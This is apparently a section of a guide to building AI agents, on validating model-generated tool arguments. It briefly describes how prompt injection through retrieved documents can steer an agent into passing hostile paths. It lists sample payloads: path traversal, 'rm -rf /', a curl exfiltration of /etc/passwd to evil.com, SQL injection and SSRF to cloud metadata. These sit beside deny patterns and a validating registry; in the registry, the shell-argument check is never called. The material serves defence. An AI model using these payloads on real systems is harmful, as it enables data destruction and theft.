# 9.4 Argument Validation

The model generates tool arguments. You should treat them exactly as you'd treat user input from the internet: potentially wrong, potentially malicious, never assumed safe.

This isn't paranoia — it's the consequence of how agents work. Tool results can contain injected instructions that manipulate subsequent model outputs. A document you retrieved might tell the model to pass `../../etc/passwd` to the next file read. Your validation is the last line of defense.

## Common Attack Vectors

### Path Traversal

```
# Model sends:
{"path": "../../etc/passwd"}
{"path": "/etc/shadow"}
{"path": "..\\Windows\\System32\\config\\SAM"}

# After resolution:
(base_dir / "../../etc/passwd").resolve() → "/etc/passwd"
# Caught by: is_relative_to(base_dir)
```

### Shell Metacharacters

```
# Model sends:
{"command": "ls", "args": ["; rm -rf /"]}
{"filename": "report.txt; curl evil.com/exfil?data=$(cat /etc/passwd)"}

# Prevention: never shell=True, always use list form of subprocess
```

### SQL Injection

```
# Model sends:
{"filter_val": "'; DROP TABLE users; --"}
{"username": "admin' OR '1'='1"}

# Prevention: parameterized queries always
```

### SSRF (Server-Side Request Forgery)

```
# Model sends a URL targeting internal infrastructure:
{"url": "http://169.254.169.254/latest/meta-data/"}  # AWS metadata
{"url": "http://localhost:8080/admin/reset"}

# Prevention: validate scheme + block internal IP ranges
```

## The Zero-Trust Tool Registry

Based on the permission enforcer at `atlas-agents/ch14_guardrails/online/tool_permission_enforcer.py:216`, a registry that validates every argument before dispatch:

```python
import re
import ipaddress
from urllib.parse import urlparse
from pathlib import Path

class ZeroTrustRegistry:
    """Validates all tool arguments for dangerous patterns before execution."""

    DANGEROUS_PATH_PATTERNS = [
        r"\.\.",            # Directory traversal
        r"^/etc/",
        r"^/proc/",
        r"^/sys/",
        r"\\\\",            # UNC paths on Windows
    ]

    DANGEROUS_SHELL_PATTERNS = [
        r"[;&|`$]",         # Shell metacharacters
        r"\$\(",            # Command substitution
        r">\s*/",           # Redirection to root paths
    ]

    INTERNAL_IP_RANGES = [
        ipaddress.ip_network("10.0.0.0/8"),
        ipaddress.ip_network("172.16.0.0/12"),
        ipaddress.ip_network("192.168.0.0/16"),
        ipaddress.ip_network("127.0.0.0/8"),
        ipaddress.ip_network("169.254.0.0/16"),  # Link-local / AWS metadata
    ]

    def validate_path(self, path: str, base_dir: Path) -> str | None:
        """Returns error string if invalid, None if safe."""
        for pattern in self.DANGEROUS_PATH_PATTERNS:
            if re.search(pattern, path):
                return f"Dangerous path pattern detected: '{pattern}' in '{path}'"

        resolved = (base_dir / path).resolve()
        if not resolved.is_relative_to(base_dir):
            return f"Path escapes sandbox: '{path}' resolves to '{resolved}'"

        return None  # Safe

    def validate_shell_arg(self, arg: str) -> str | None:
        for pattern in self.DANGEROUS_SHELL_PATTERNS:
            if re.search(pattern, arg):
                return f"Shell injection pattern detected in argument: '{arg}'"
        return None

    def validate_url(self, url: str) -> str | None:
        parsed = urlparse(url)

        if parsed.scheme not in ("http", "https"):
            return f"URL scheme '{parsed.scheme}' is not allowed. Use http or https."

        # Check for internal IP addresses
        try:
            host = parsed.hostname
            ip = ipaddress.ip_address(host)
            for network in self.INTERNAL_IP_RANGES:
                if ip in network:
                    return f"URL targets internal network: {url}"
        except (ValueError, TypeError):
            pass  # hostname is a domain name, not an IP — OK

        return None

    def execute(self, tool_name: str, args: dict, base_dir: Path = None) -> str:
        # Validate all arguments before execution
        for key, value in args.items():
            if not isinstance(value, str):
                continue

            # Validate path-like arguments
            if key in ("path", "file", "filename", "filepath") and base_dir:
                error = self.validate_path(value, base_dir)
                if error:
                    self._log_blocked_call(tool_name, args, error)
                    return f"Error: {error}"

            # Validate URL arguments
            if key in ("url", "endpoint", "webhook"):
                error = self.validate_url(value)
                if error:
                    self._log_blocked_call(tool_name, args, error)
                    return f"Error: {error}"

        return self._dispatch(tool_name, args)

    def _log_blocked_call(self, tool_name: str, args: dict, reason: str):
        """Audit log — every blocked call is recorded."""
        import json
        import time
        print(f"[BLOCKED] {time.time()} tool={tool_name} args={json.dumps(args)} reason={reason}")
```

## The Audit Log

Every tool invocation should be logged — whether it succeeds or is blocked:

```python
import json
import time
import logging

audit_logger = logging.getLogger("tool_audit")

def logged_execute(tool_name: str, args: dict, caller: str = "agent") -> str:
    start = time.time()
    result = registry.execute(tool_name, args)
    elapsed = time.time() - start

    audit_logger.info(json.dumps({
        "timestamp": start,
        "caller": caller,
        "tool": tool_name,
        "args": args,
        "result_prefix": result[:100],   # First 100 chars only
        "success": not result.startswith("Error:"),
        "elapsed_ms": round(elapsed * 1000),
    }))

    return result
```

The audit log has three purposes: debugging (why did the agent do that?), security review (was anything suspicious called?), and performance monitoring (which tools are slow?).

## Type Coercion Failures

The model sometimes passes the wrong type for a typed argument:

```python
# Model sends: {"count": "5"}  (string, not int)
# Your function expects: count: int

def safe_int(value, default=None):
    try:
        return int(value)
    except (ValueError, TypeError):
        return default

def list_items(count: int) -> str:
    safe_count = safe_int(count, default=10)
    if safe_count < 1 or safe_count > 100:
        return "Error: count must be between 1 and 100"
    ...
```

Or use Pydantic for argument validation:

```python
from pydantic import BaseModel, Field

class ListItemsArgs(BaseModel):
    count: int = Field(ge=1, le=100, default=10)

def list_items_validated(raw_args: dict) -> str:
    try:
        args = ListItemsArgs.model_validate(raw_args)
    except ValidationError as e:
        return f"Error: Invalid arguments: {e}"
    return list_items(args.count)
```

This is especially useful for complex argument schemas where the model might get nested object formats wrong.
